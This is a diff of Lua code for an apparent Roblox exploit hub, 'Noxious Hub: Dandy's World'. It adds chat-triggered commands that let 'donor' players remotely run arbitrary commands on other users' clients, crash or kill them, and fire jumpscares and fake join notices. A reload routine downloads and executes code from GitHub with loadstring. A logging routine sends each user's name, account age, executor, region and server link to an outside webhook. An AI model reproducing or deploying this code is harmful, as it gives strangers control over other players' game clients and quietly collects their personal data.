+	local channel = noxious["text chat service"].TextChannels:FindFirstChild("RBXGeneral")
+
+	if channel then
+		channel:SendAsync"/e voicesscare"		
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+function mancrying()
+
+	local sound = Instance.new("Sound")		
+	sound.SoundId = "rbxassetid://688596285"
+	sound.Volume = 10
+	sound.Parent = noxious["player gui"]
+	sound:Play()
+end
+
+addcommand("scriptmancrying", "smc", function()
+	if not donor(noxious["username"]) then
+		notify("You need to be a Donor in order to execute this command.", 5, "error")
+		return
+	end
+
+	local channel = noxious["text chat service"].TextChannels:FindFirstChild("RBXGeneral")
+
+	if channel then
+		channel:SendAsync"/e malecryscare"		
+	end
+end)
+
+function womancrying()
+
+	local sound = Instance.new("Sound")		
+	sound.SoundId = "rbxassetid://7014161416"
+	sound.Volume = 10
+	sound.Parent = noxious["player gui"]
+	sound:Play()
+end
+
+addcommand("scriptwomancrying", "swc", function()
+	if not donor(noxious["username"]) then
+		notify("You need to be a Donor in order to execute this command.", 5, "error")
+		return
+	end
+
+	local channel = noxious["text chat service"].TextChannels:FindFirstChild("RBXGeneral")
+
+	if channel then
+		channel:SendAsync"/e femalecryscare"		
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("scriptfakeunablenotify", "sfun", function()
+	if not donor(noxious["username"]) then
+		notify("You need to be a Donor in order to execute this command.", 5, "error")
+		return
+	end
+
+	local channel = noxious["text chat service"].TextChannels:FindFirstChild("RBXGeneral")
+
+	if channel then
+		channel:SendAsync"/e fakeunablejoined"		
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("scriptfakehypnicnotify", "sfhn", function()
+	if not donor(noxious["username"]) then
+		notify("You need to be a Donor in order to execute this command.", 5, "error")
+		return
+	end
+
+	local channel = noxious["text chat service"].TextChannels:FindFirstChild("RBXGeneral")
+
+	if channel then
+		channel:SendAsync"/e fakehypnicjoined"		
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("scriptfakeacenotify", "sfan", function()
+	if not donor(noxious["username"]) then
+		notify("You need to be a Donor in order to execute this command.", 5, "error")
+		return
+	end
+
+	local channel = noxious["text chat service"].TextChannels:FindFirstChild("RBXGeneral")
+
+	if channel then
+		channel:SendAsync"/e aj"		
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("scriptfakeqwelvernotify", "sfqn", function()
+
+	local channel = noxious["text chat service"].TextChannels:FindFirstChild("RBXGeneral")
+
+	if channel then
+		channel:SendAsync"/e fakeqwelverjoined"		
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("scriptfaketeammembernotify", "sftmn", function()
+
+	local channel = noxious["text chat service"].TextChannels:FindFirstChild("RBXGeneral")
+
+	if channel then
+		channel:SendAsync"/e faketeammemberjoined"		
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+function reloadnoxious()
+	_G.dswdnoxiousloaded = false
+	closeallnotifs()
+	stoprunningconnections()
+	execcmd("hdl")
+
+	task.spawn(function()
+		noxious["toggle interface visibility button"].Visible = false
+		noxious["mainframe"].Visible = false
+		task.wait(6)
+		noxious["toggle interface visibility button"]:Destroy()
+		mainframe:Destroy()
+	end)
+
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/Team-Noxious/Noxious-Hub/refs/heads/main/Dandy's%20World/Noxious%20Hub"))()
+end
+
+local reloadcommandcallcount = 0
+
+function reloadnoxiouscommand()
+	reloadcommandcallcount += 1
+
+	if reloadcommandcallcount == 1 then
+		notify("Type command again to confirm.", 5)
+	end
+	if reloadcommandcallcount == 2 then
+		reloadnoxious()
+	end
+end
+
+local reloadcallcount = 0
+
+noxious["reload noxious button"].MouseButton1Click:Connect(function()
+	playclicksound()
+
+	reloadcallcount += 1
+
+	if reloadcallcount == 1 then
+		notify("Click button again to confirm.", 5)
+	end
+
+	if reloadcallcount == 2 then
+		task.spawn(function()
+			reloadnoxious()
+		end)
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+function addBillboardGui(player)
+	local function onchar(character)
+		local HRP = character:WaitForChild("HumanoidRootPart", 5)
+
+		if HRP and not HRP:FindFirstChild("UserImageBillboard") then
+			local billboardGui = Instance.new("BillboardGui")				
+			billboardGui.Name = "UserImageBillboard"
+			billboardGui.Size = UDim2.new(2.5, 0, 2.5, 0)
+			billboardGui.AlwaysOnTop = true
+			billboardGui.MaxDistance = math.huge
+
+			local imageLabel = Instance.new("ImageLabel")				
+			imageLabel.Size = UDim2.new(1, 0, 1, 0)
+			imageLabel.BackgroundTransparency = 1
+			imageLabel.Image = "rbxassetid://100574547642033"
+			imageLabel.ZIndex = 10
+			imageLabel.ImageColor3 = Color3.new(1,1,1)
+
+			local uiCorner = Instance.new("UICorner")				
+			uiCorner.CornerRadius = UDim.new(0.2, 0)
+			uiCorner.Parent = imageLabel
+
+			imageLabel.Parent = billboardGui
+			billboardGui.Parent = HRP
+		end
+	end
+
+	if player.Character then
+		onchar(player.Character)
+	end
+	player.CharacterAdded:Connect(onchar)
+end
+
+for _, player in pairs(noxious["players"]:GetPlayers()) do
+	if table.find(noxious["admins"], player.Name) then
+		addBillboardGui(player)
+	end
+end
+
+noxious["players"].PlayerAdded:Connect(function(player)
+	if table.find(noxious["admins"], player.Name) then
+		addBillboardGui(player)
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+function usercheck()
+	local channel = noxious["text chat service"].TextChannels:FindFirstChild("RBXGeneral")
+
+	if channel then
+		channel:SendAsync"/e im using noxious"		
+	end
+end
+
+addcommand("noxioususercheck", "nxsuc", function()
+	if not donor(noxious["username"]) then
+		notify("You need to be a Donor in order to execute this command.", 5, "error")
+		return
+	end
+
+	local TextChatService = noxious["text chat service"]
+	local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
+	if not channel then
+		notify("RBXGeneral channel not found.", 5, "error")
+		return
+	end
+
+	local responders = {}
+
+	local connection
+	connection = channel.MessageReceived:Connect(function(message)
+		if typeof(message) == "Instance" and message:IsA("TextChatMessage") then
+			if message.Text:lower():match("^/e%s+im using noxious$") then
+				local author = message.TextSource
+				if author and not responders[author] then
+					responders[author] = true
+				end
+			end
+		end
+	end)
+
+	channel:SendAsync("/e check")
+
+	task.delay(5, function()
+		if connection then
+			connection:Disconnect()
+		end
+
+		local count = 0
+		for _ in pairs(responders) do
+			count += 1
+		end
+
+		notify("There are " .. count .. " players using Noxious Hub: Dandy's World.", 5)
+	end)
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+function donorwhatsappastro(character)
+	if not character then return end
+
+	local partsToTexture = {"Body", "Cap", "Head", "LegL", "LegL2", "LegR", "LegR2"}
+
+	for _, partName in ipairs(partsToTexture) do
+		local part = character:FindFirstChild(partName)
+		if part and (part:IsA("SpecialMesh") or part:IsA("MeshPart")) then
+			part.TextureID = "rbxassetid://106334801105183"
+		end
+	end
+
+	local magicL = character:FindFirstChild("MagicL")
+	local magicR = character:FindFirstChild("MagicR")
+
+	if magicL and (magicL:IsA("SpecialMesh") or magicL:IsA("MeshPart")) then
+		magicL.Color = Color3.fromRGB(99, 178, 100)
+		local emitter = magicL:FindFirstChildOfClass("ParticleEmitter")
+		if emitter then
+			emitter.Color = ColorSequence.new(Color3.fromRGB(100, 251, 105))
+		end
+	end
+
+	if magicR and (magicR:IsA("SpecialMesh") or magicR:IsA("MeshPart")) then
+		magicR.Color = Color3.fromRGB(99, 178, 100)
+		local emitter = magicR:FindFirstChildOfClass("ParticleEmitter")
+		if emitter then
+			emitter.Color = ColorSequence.new(Color3.fromRGB(100, 251, 105))
+		end
+	end
+
+	local config = character:FindFirstChild("Config")
+	if config and config:FindFirstChild("HurtTexture") then
+		config.HurtTexture.Texture = "rbxassetid://103271535882802"
+	end
+end
+
+addcommand("scriptwhatsappastro", "swhatsappastro", function()
+	if not checktoon("Astro") then return end
+	if not donor(noxious["username"]) then
+		notify("You need to be a Donor in order to execute this command.", 5, "error")
+		return
+	end
+
+	local channel = noxious["text chat service"].TextChannels:FindFirstChild("RBXGeneral")
+
+	if channel then
+		channel:SendAsync"/e greenmoon"		
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+function donorfacelessshrimpo(character)
+	if not character then return end
+	local head = character:WaitForChild("Head")
+	head.TextureID = "rbxassetid://74753871938677"
+end
+
+addcommand("scriptfacelessshrimpo", "sflshrimpo", function()
+	if not checktoon("Shrimpo") then return end
+	if not donor(noxious["username"]) then
+		notify("You need to be a Donor in order to execute this command.", 5, "error")
+		return
+	end
+
+	local channel = noxious["text chat service"].TextChannels:FindFirstChild("RBXGeneral")
+
+	if channel then
+		channel:SendAsync"/e facelessshrimp"		
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+if not noxious["in studio"] then
+	local Players = game:GetService("Players")
+	task.wait(1)
+
+	local orbitConfigs = {
+		boxten = {
+			key = "boxten orbiter",
+			meshId = "rbxassetid://16987636120",
+			textureId = "rbxassetid://16987597868",
+			size = Vector3.new(1, 1, 1),
+		},
+		shrimpo = {
+			key = "shrimpo orbiter",
+			meshId = "rbxassetid://127944646395421",
+			textureId = "rbxassetid://111384176423148",
+			size = Vector3.new(0.4, 0.4, 0.4),
+		},
+		cosmo = {
+			key = "cosmo orbiter",
+			meshId = "rbxassetid://18594830201",
+			textureId = "rbxassetid://130874271887611",
+			size = Vector3.new(0.5, 0.5, 0.5),
+		},
+	}
+
+	for label, config in pairs(orbitConfigs) do
+		local orbitData = {}
+
+		local function isTargetPlayer(name)
+			for _, n in ipairs(noxious[config.key]) do
+				if name:lower() == n:lower() then
+					return true
+				end
+			end
+			return false
+		end
+
+		local function cleanParts(player)
+			local data = orbitData[player]
+			if data then
+				for _, part in ipairs(data.parts) do
+					part:Destroy()
+				end
+				if data.connection then data.connection:Disconnect() end
+				if data.sound then
+					data.sound:Stop()
+					data.sound:Destroy()
+				end
+				orbitData[player] = nil
+			end
+		end
+
+		local function createParts(player)
+			local char = player.Character
+			if not char then return end
+			local hrp = char:FindFirstChild("HumanoidRootPart")
+			if not hrp then return end
+
+			local parts, axes, rots = {}, {}, {}
+			local function mesh()
+				local p = Instance.new("MeshPart")
+				p.MeshId = config.meshId
+				p.TextureID = config.textureId
+				p.Size = config.size
+				p.Color = Color3.new(0, 0, 0)
+				p.Material = Enum.Material.Neon
+				p.Anchored = true
+				p.CanCollide = false
+				p.Parent = workspace
+				return p
+			end
+
+			local function axis()
+				local x, y, z
+				repeat
+					x, y, z = math.random(-100, 100), math.random(-100, 100), math.random(-100, 100)
+				until x ~= 0 or y ~= 0 or z ~= 0
+				return Vector3.new(x, y, z).Unit
+			end
+
+			for i = 1, 9 do
+				table.insert(parts, mesh())
+				table.insert(axes, axis())
+				table.insert(rots, CFrame.new())
+			end
+
+			local function update(dt)
+				for i, p in ipairs(parts) do
+					local angle = tick() * 0.8 + (math.pi * 2 / 9) * (i - 1)
+					local x, z = math.cos(angle) * 7, math.sin(angle) * 7
+					local pos = Vector3.new(hrp.Position.X + x, hrp.Position.Y + 0.5, hrp.Position.Z + z)
+					local delta = CFrame.fromAxisAngle(axes[i], dt * math.rad(72))
+					rots[i] *= delta
+					p.CFrame = CFrame.new(pos) * rots[i]
+				end
+			end
+
+			local conn = noxious["run service"].RenderStepped:Connect(function(dt)
+				if not player.Parent or not player.Character or not hrp.Parent then
+					cleanParts(player)
+					return
+				end
+				update(dt)
+			end)
+
+			orbitData[player] = { parts = parts, connection = conn }
+		end
+
+		local function applyTo(player)
+			if isTargetPlayer(player.Name) then
+				player.CharacterAdded:Connect(function()
+					task.wait(0.1)
+					cleanParts(player)
+					createParts(player)
+				end)
+				if player.Character then
+					cleanParts(player)
+					createParts(player)
+				end
+			end
+		end
+
+		for _, p in ipairs(Players:GetPlayers()) do
+			applyTo(p)
+		end
+
+		Players.PlayerAdded:Connect(applyTo)
+		Players.PlayerRemoving:Connect(cleanParts)
+	end
+end
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+function log()
+	if logexecution == true then
+		task.spawn(function()
+			notify("You have been logged.", 5)
+			task.wait(1.5)
+			notify("You can disable logging by toggling the option in the settings.", 5)
+		end)
+		if not noxious["in studio"] then
+			local AccountAge = noxious["local player"].AccountAge
+			local Country = game.LocalizationService.RobloxLocaleId
+			local ConsoleJobId = game.JobId
+
+			local GAMENAME = noxious["marketplace service"]:GetProductInfo(game.PlaceId).Name
+
+			local function detectExecutor()
+				return identifyexecutor()
+			end
+
+			local function createWebhookData()
+				local webhookcheck = detectExecutor()
+
+				local data = {
+					avatar_url="",
+					content="**" .. noxious["display name"] .. " (@​" .. noxious["username"] .. ")** Executed **Noxious Hub: Dandys World (Version " .. noxious["version"] .. ")** | [**View Player**](https://www.roblox.com/users/" .. noxious["user id"] .. ") | [**Join Server**](https://www.roblox.com/games/start?placeId=84414892540434&launchData=" .. game.PlaceId .. "/" .. ConsoleJobId .. ")",
+					embeds={
+						{
+							author={
+								name="",
+								url="https://roblox.com",
+							},
+							description=tostring(
+								"\n\n**[Noxious Info]:**" ..
+									"\n**• Version:** `"..noxious["version"].."`" ..
+
+									"\n\n**[[User Info]:](https://www.roblox.com/users/"..noxious["user id"]..")**" ..
+									"\n**• Display Name:** `"..noxious["display name"].."`" ..
+									"\n**• Username:** `"..noxious["username"].."`" .. 
+									"\n**• Account Age:** `"..AccountAge.."`" ..
+									"\n**• Executor:** `"..webhookcheck.."`" ..
+									"\n**• Region:** `"..Country.."`" ..
+
+									"\n\n**[[Game Info]:](https://www.roblox.com/games/"..game.PlaceId..")**" ..
+									"\n**• Game:** `"..GAMENAME.."`"
+
+							),
+							type="rich",
+							color=tonumber"0xFFFFFF",
+							thumbnail={
+								url="https://www.roblox.com/headshot-thumbnail/image?userId=" .. noxious["local player"].UserId .. "&width=420&height=420&format=png"
+							},
+						}
+					}
+				}
+				return noxious["http service"]:JSONEncode(data)
+			end
+
+			local function sendWebhook(webhookUrl, data)
+				local headers = {
+					["content-type"] = "application/json"
+				}
+
+				local request = http_request or request or HttpPost or syn.request
+				local abcdef = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
+				request(abcdef)
+			end
+
+			local webhookUrl = "https://script.google.com/macros/s/AKfycbyflTy7i3Jm8h0Ip33o9_wCrB35gf6UcCCpUTxohk48qNvebVIj_-Uub_watA77wOiBtA/exec"
+			local webhookData = createWebhookData()
+
+			sendWebhook(webhookUrl, webhookData)
+		end
+	end
+end
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+task.wait(1)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+function ondonorchatted(player, message)
+	local cmd, args = message:match("^/e%s+(%S+)%s*(.*)$")
+
+	if not donor(player.Name) then return end
+
+	if not donor(noxious["username"]) then
+		processDonorCommandFrom(player, message)
+	end
+end
+
+function processDonorCommandFrom(sender, message)
+	local cmd, args = message:match("^/e%s+(%S+)%s*(.*)$")
+
+	if cmd == "sn" and args ~= "" then
+		notify(args, 5)
+
+	elseif cmd == "do" and args ~= "" then
+		execcmd(args)	
+
+	elseif message == "/e check" then
+		usercheck()
+
+	elseif message == "/e greenmoon" then
+		donorwhatsappastro(sender)
+
+	elseif message == "/e facelessshrimp" then
+		donorwhatsappastro(sender)
+
+	elseif message == "/e shrimpspam" then
+		dwshrimpdecal()
+	elseif message == "/e noxiousspam" then
+		noxiousdecalspam()
+	elseif message == "/e scaryspam" then
+		scarydecalspam()
+	elseif message == "/e superscaryspam" then
+		veryscarydecalspam()
+
+	elseif message == "/e jobscare" then
+		jobapplicationjumpscare()
+	elseif message == "/e dogscare" then
+		ps4glitchjumpscare()
+	elseif message == "/e catscare" then
+		lucyjumpscare()
+	elseif message == "/e conniescare" then
+		conniejumpscare()
+	elseif message == "/e rockscare" then
+		buffpebblejumpscare()
+	elseif message == "/e flowerscare" then
+		dandyjumpscare()
+	elseif message == "/e eightballscare" then
+		toodlesjumpscare()
+	elseif message == "/e shrimpscare" then
+		shrimpojumpscare()
+	elseif message == "/e albertscare" then
+		albertjumpscare()
+	elseif message == "/e fruitcakescare" then
+		fruitcakejumpscare()
+	elseif message == "/e jewelryboxscare" then
+		jewelryboxjumpscare()
+	elseif message == "/e menacingflowerscare" then
+		sharingandandyjumpscare()
+	elseif message == "/e shrimpscare2" then
+		shrimpo2jumpscare()
+	elseif message == "/e shellscare" then
+		shellyjumpscare()
+	elseif message == "/e strawberryscare" then
+		sproutjumpscare()
+	elseif message == "/e flashbang" then
+		flashbang()
+	elseif message == "/e jumpscare" then
+		scaryjumpscare()
+	elseif message == "/e mustard" then
+		kendricklamarjumpscare()
+
+	elseif message == "/e voicesscare" then
+		creepygirlvoice()
+	elseif message == "/e malecryscare" then
+		mancrying()
+	elseif message == "/e femalecryscare" then
+		womancrying()
+
+	elseif message == "/e inkblotscare" then
+		stripperblot()
+	elseif message == "/e palemachinescare" then
+		palemachine()
+	elseif message == "/e olviascare" then
+		olvia()
+	elseif message == "/e patrickscare" then
+		patrickbatemanscreaming()
+
+	elseif message == "/e tosender" then
+		teleportToPlayer(sender)
+	elseif message == "/e dies" then
+		execcmd("die")
+	elseif message == "/e crashes" then
+		crash()
+	elseif message == "/e stopinteracting" then
+		task.spawn(unbottombang)
+		task.spawn(dwunbang)
+		task.spawn(dwunhead)
+		task.spawn(dwunhsit)
+		task.spawn(dwunhsit2)
+		task.spawn(dwunhjsit)
+	elseif message == "/e stopconnections" then
+		stoprunningconnections()
+
+	elseif message == "/e faketeammemberjoined" then
+		notify("A Noxious Team Member joined your server.", nil, "team noxious member join")
+	elseif message == "/e fakeunablejoined" then
+		notify("A Noxious Team Member joined your server.", nil, "team noxious member join")
+		notify("Unable joined your server.", nil, "unable join")
+	elseif message == "/e fakehypnicjoined" then
+		notify("A Noxious Team Member joined your server.", nil, "team noxious member join")
+		notify("Hypnic joined your server.", nil, "hypnic join")
+	elseif message == "/e fakeqwelverjoined" then
+		notify("Qwelver joined your server.", nil, "qwelver join")
+	end
+end
+
+function donorcmdlistener(player)
+	player.Chatted:Connect(function(message)
+		ondonorchatted(player, message)
+	end)
+end
+
+for _, player in pairs(noxious["players"]:GetPlayers()) do
+	donorcmdlistener(player)
+end
+
+noxious["players"].PlayerAdded:Connect(donorcmdlistener)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+-- welcome to the animation gui
+noxious["animations"] = {
+	Astro = {
+		normalidle = "rbxassetid://17477484184",
+		normalwalking = "rbxassetid://17477562502",
+		normalrunning = "rbxassetid://000000000000000000000000000000000000",
+		extracting = "rbxassetid://17485172105",
+		normalability = "rbxassetid://000000000000000000000000000000000000",
+		quirk1 = "rbxassetid://000000000000000000000000000000000000",
+		quirk2 = "rbxassetid://000000000000000000000000000000000000",
+		quirk3 = "rbxassetid://000000000000000000000000000000000000",
+
+		twistedidle = "rbxassetid://17616899088",
+		twistedwalking = "rbxassetid://17617109508",
+		twistedrunning = "rbxassetid://17617489384",
+		twistedability = "rbxassetid://000000000000000000000000000000000000",
+		attacking = "rbxassetid://000000000000000000000000000000000000",
+		lostinterest = "rbxassetid://000000000000000000000000000000000000",
+		extra1 = "rbxassetid://000000000000000000000000000000000000",
+		extra2 = "rbxassetid://000000000000000000000000000000000000",
+		extra3 = "rbxassetid://000000000000000000000000000000000000",
+	},
+	Bassie = {
+		normalidle = "rbxassetid://113260830809862",
+		normalwalking = "rbxassetid://132205223700091",
+		normalrunning = "rbxassetid://10108152024909",
+		extracting = "rbxassetid://119621623204298",
+		normalability = "rbxassetid://000000000000000000000000000000000000",
+		quirk1 = "rbxassetid://000000000000000000000000000000000000",
+		quirk2 = "rbxassetid://000000000000000000000000000000000000",
+		quirk3 = "rbxassetid://000000000000000000000000000000000000",
+
+		twistedidle = "rbxassetid://72811631558470",
+		twistedwalking = "rbxassetid://130316854498842",
+		twistedrunning = "rbxassetid://80250651929564",
+		twistedability = "rbxassetid://000000000000000000000000000000000000",
+		attacking = "rbxassetid://000000000000000000000000000000000000",
+		lostinterest = "rbxassetid://000000000000000000000000000000000000",
+		extra1 = "rbxassetid://000000000000000000000000000000000000",
+		extra2 = "rbxassetid://000000000000000000000000000000000000",
+		extra3 = "rbxassetid://000000000000000000000000000000000000",
+	},
+	Blot = {
+		normalidle = "rbxassetid://73993990162132",
+		normalwalking = "rbxassetid://76703698283994",
+		normalrunning = "rbxassetid://105628011122110",
+		extracting = "rbxassetid://116500889072011",
+		normalability = "rbxassetid://000000000000000000000000000000000000",
+		quirk1 = "rbxassetid://000000000000000000000000000000000000",
+		quirk2 = "rbxassetid://000000000000000000000000000000000000",
+		quirk3 = "rbxassetid://000000000000000000000000000000000000",
+
+		twistedidle = "rbxassetid://111801801891099",
+		twistedwalking = "rbxassetid://136494123759902",
+		twistedrunning = "rbxassetid://102718775893345",
+		twistedability = "rbxassetid://000000000000000000000000000000000000",
+		attacking = "rbxassetid://000000000000000000000000000000000000",
+		lostinterest = "rbxassetid://000000000000000000000000000000000000",
+		extra1 = "rbxassetid://000000000000000000000000000000000000",
+		extra2 = "rbxassetid://000000000000000000000000000000000000",
+		extra3 = "rbxassetid://000000000000000000000000000000000000",
+	},
+	Bobette = {
+		normalidle = "rbxassetid://121960921916341",
+		normalwalking = "rbxassetid://108971895466704",
+		normalrunning = "rbxassetid://98111731270842",
+		extracting = "rbxassetid://72425276030716",
+		normalability = "rbxassetid://000000000000000000000000000000000000",
+		quirk1 = "rbxassetid://000000000000000000000000000000000000",
+		quirk2 = "rbxassetid://000000000000000000000000000000000000",
+		quirk3 = "rbxassetid://000000000000000000000000000000000000",
+
+		twistedidle = "rbxassetid://92649757944698",
+		twistedwalking = "rbxassetid://112758791648621",
+		twistedrunning = "rbxassetid://124902427828033",
+		twistedability = "rbxassetid://000000000000000000000000000000000000",
+		attacking = "rbxassetid://000000000000000000000000000000000000",
+		lostinterest = "rbxassetid://000000000000000000000000000000000000",
+		extra1 = "rbxassetid://000000000000000000000000000000000000",
+		extra2 = "rbxassetid://000000000000000000000000000000000000",
+		extra3 = "rbxassetid://000000000000000000000000000000000000",
+	},
+	Boxten = {
+		normalidle = "rbxassetid://16987798588",
+		normalwalking = "rbxassetid://16987891441",
+		normalrunning = "rbxassetid://000000000000000000000000000000000000",
+		extracting = "rbxassetid://16987946868",
+		normalability = "rbxassetid://000000000000000000000000000000000000",
+		quirk1 = "rbxassetid://000000000000000000000000000000000000",
+		quirk2 = "rbxassetid://000000000000000000000000000000000000",
+		quirk3 = "rbxassetid://000000000000000000000000000000000000",
+
+		twistedidle = "rbxassetid://17173910857",
+		twistedwalking = "rbxassetid://17173980406",
+		twistedrunning = "rbxassetid://17174260770",
+		twistedability = "rbxassetid://000000000000000000000000000000000000",
+		attacking = "rbxassetid://000000000000000000000000000000000000",
+		lostinterest = "rbxassetid://000000000000000000000000000000000000",
+		extra1 = "rbxassetid://000000000000000000000000000000000000",
+		extra2 = "rbxassetid://000000000000000000000000000000000000",
+		extra3 = "rbxassetid://000000000000000000000000000000000000",
+	},
+	Brightney = {
+		normalidle = "rbxassetid://17266012992",
+		normalwalking = "rbxassetid://17267881920",
+		normalrunning = "rbxassetid://000000000000000000000000000000000000",
+		extracting = "rbxassetid://17268071696",
+		normalability = "rbxassetid://000000000000000000000000000000000000",
+		quirk1 = "rbxassetid://000000000000000000000000000000000000",
+		quirk2 = "rbxassetid://000000000000000000000000000000000000",
+		quirk3 = "rbxassetid://000000000000000000000000000000000000",
+
+		twistedidle = "rbxassetid://17638507046",
+		twistedwalking = "rbxassetid://17638574879",
+		twistedrunning = "rbxassetid://17638734882",
+		twistedability = "rbxassetid://000000000000000000000000000000000000",
+		attacking = "rbxassetid://000000000000000000000000000000000000",
+		lostinterest = "rbxassetid://000000000000000000000000000000000000",
+		extra1 = "rbxassetid://000000000000000000000000000000000000",
+		extra2 = "rbxassetid://000000000000000000000000000000000000",
+		extra3 = "rbxassetid://000000000000000000000000000000000000",
+	},
+	Coal = {
+		normalidle = "rbxassetid://131700177149552",
+		normalwalking = "rbxassetid://116657137600663",
+		normalrunning = "rbxassetid://75018575525754",
+		extracting = "rbxassetid://128454844417288",
+		normalability = "rbxassetid://000000000000000000000000000000000000",
+		quirk1 = "rbxassetid://000000000000000000000000000000000000",
+		quirk2 = "rbxassetid://000000000000000000000000000000000000",
+		quirk3 = "rbxassetid://000000000000000000000000000000000000",
+
+		twistedidle = "rbxassetid://101231527013004",
+		twistedwalking = "rbxassetid://132967583757528",
+		twistedrunning = "rbxassetid://88133391461421",
+		twistedability = "rbxassetid://000000000000000000000000000000000000",
+		attacking = "rbxassetid://000000000000000000000000000000000000",
+		lostinterest = "rbxassetid://000000000000000000000000000000000000",
+		extra1 = "rbxassetid://000000000000000000000000000000000000",
+		extra2 = "rbxassetid://000000000000000000000000000000000000",
+		extra3 = "rbxassetid://000000000000000000000000000000000000",
+	},
+	Cocoa = {
+		normalidle = "rbxassetid://128300795612869",
+		normalwalking = "rbxassetid://113856775888112",
+		normalrunning = "rbxassetid://112748305182855",
+		extracting = "rbxassetid://1157632328364",
+		normalability = "rbxassetid://000000000000000000000000000000000000",
+		quirk1 = "rbxassetid://000000000000000000000000000000000000",
+		quirk2 = "rbxassetid://000000000000000000000000000000000000",
+		quirk3 = "rbxassetid://000000000000000000000000000000000000",
+
+		twistedidle = "rbxassetid://89407029329628",
+		twistedwalking = "rbxassetid://124995985864941",
+		twistedrunning = "rbxassetid://77242325839730",
+		twistedability = "rbxassetid://000000000000000000000000000000000000",
+		attacking = "rbxassetid://000000000000000000000000000000000000",
+		lostinterest = "rbxassetid://000000000000000000000000000000000000",
+		extra1 = "rbxassetid://000000000000000000000000000000000000",
+		extra2 = "rbxassetid://000000000000000000000000000000000000",
+		extra3 = "rbxassetid://000000000000000000000000000000000000",
+	},
+	Connie = {
+		normalidle = "rbxassetid://96412679901902",
+		normalwalking = "rbxassetid://71819089910283",
+		normalrunning = "rbxassetid://71819089910283",
+		extracting = "rbxassetid://133500601575506",
+		normalability = "rbxassetid://000000000000000000000000000000000000",
+		quirk1 = "rbxassetid://000000000000000000000000000000000000",
+		quirk2 = "rbxassetid://000000000000000000000000000000000000",
+		quirk3 = "rbxassetid://000000000000000000000000000000000000",
+
+		twistedidle = "rbxassetid://140696695675999",
+		twistedwalking = "rbxassetid://73609609622544",
+		twistedrunning = "rbxassetid://81505996760447",
+		twistedability = "rbxassetid://000000000000000000000000000000000000",
+		attacking = "rbxassetid://000000000000000000000000000000000000",
+		lostinterest = "rbxassetid://000000000000000000000000000000000000",
+		extra1 = "rbxassetid://000000000000000000000000000000000000",
+		extra2 = "rbxassetid://000000000000000000000000000000000000",
+		extra3 = "rbxassetid://000000000000000000000000000000000000",
+	},
+	Cosmo = {
+		normalidle = "rbxassetid://18608700264",
+		normalwalking = "rbxassetid://18608782689",
+		normalrunning = "rbxassetid://000000000000000000000000000000000000",
+		extracting = "rbxassetid://18609287742",
+		normalability = "rbxassetid://000000000000000000000000000000000000",
+		quirk1 = "rbxassetid://000000000000000000000000000000000000",
+		quirk2 = "rbxassetid://000000000000000000000000000000000000",
+		quirk3 = "rbxassetid://000000000000000000000000000000000000",
+
+		twistedidle = "rbxassetid://18682187542",
+		twistedwalking = "rbxassetid://18682136751",
+		twistedrunning = "rbxassetid://18682530957",
+		twistedability = "rbxassetid://000000000000000000000000000000000000",
+		attacking = "rbxassetid://000000000000000000000000000000000000",
+		lostinterest = "rbxassetid://000000000000000000000000000000000000",
+		extra1 = "rbxassetid://000000000000000000000000000000000000",
+		extra2 = "rbxassetid://000000000000000000000000000000000000",
+		extra3 = "rbxassetid://000000000000000000000000000000000000",
+	},
+	Dandy = {
+		normalidle = "rbxassetid://16496520991",
+		normalwalking = "rbxassetid://16496812530",
+		normalrunning = "rbxassetid://000000000000000000000000000000000000",
+		extracting = "rbxassetid://16496852675",
+		normalability = "rbxassetid://000000000000000000000000000000000000",
+		quirk1 = "rbxassetid://000000000000000000000000000000000000",
+		quirk2 = "rbxassetid://000000000000000000000000000000000000",
+		quirk3 = "rbxassetid://000000000000000000000000000000000000",
+
+		twistedidle = "rbxassetid://17515694121",
+		twistedwalking = "rbxassetid://17515542297",
+		twistedrunning = "rbxassetid://17516071317",
+		twistedability = "rbxassetid://000000000000000000000000000000000000",
+		attacking = "rbxassetid://000000000000000000000000000000000000",
+		lostinterest = "rbxassetid://000000000000000000000000000000000000",
+		extra1 = "rbxassetid://000000000000000000000000000000000000",
+		extra2 = "rbxassetid://000000000000000000000000000000000000",
+		extra3 = "rbxassetid://000000000000000000000000000000000000",
+	},
+	Eggson = {
+		normalidle = "rbxassetid://129628437580538",
+		normalwalking = "rbxassetid://74613594041941",
+		normalrunning = "rbxassetid://140018826183412",
+		extracting = "rbxassetid://71945598652324",
+		normalability = "rbxassetid://000000000000000000000000000000000000",
+		quirk1 = "rbxassetid://000000000000000000000000000000000000",
+		quirk2 = "rbxassetid://000000000000000000000000000000000000",
+		quirk3 = "rbxassetid://000000000000000000000000000000000000",
+
+		twistedidle = "rbxassetid://94997531878151",
+		twistedwalking = "rbxassetid://70943522849975",
+		twistedrunning = "rbxassetid://134803511177431",
+		twistedability = "rbxassetid://000000000000000000000000000000000000",
+		attacking = "rbxassetid://000000000000000000000000000000000000",
+		lostinterest = "rbxassetid://000000000000000000000000000000000000",
+		extra1 = "rbxassetid://000000000000000000000000000000000000",
+		extra2 = "rbxassetid://000000000000000000000000000000000000",
+		extra3 = "rbxassetid://000000000000000000000000000000000000",
+	},
+	Finn = {
+		normalidle = "rbxassetid://18717443931",
+		normalwalking = "rbxassetid://18717500470",
+		normalrunning = "rbxassetid://000000000000000000000000000000000000",
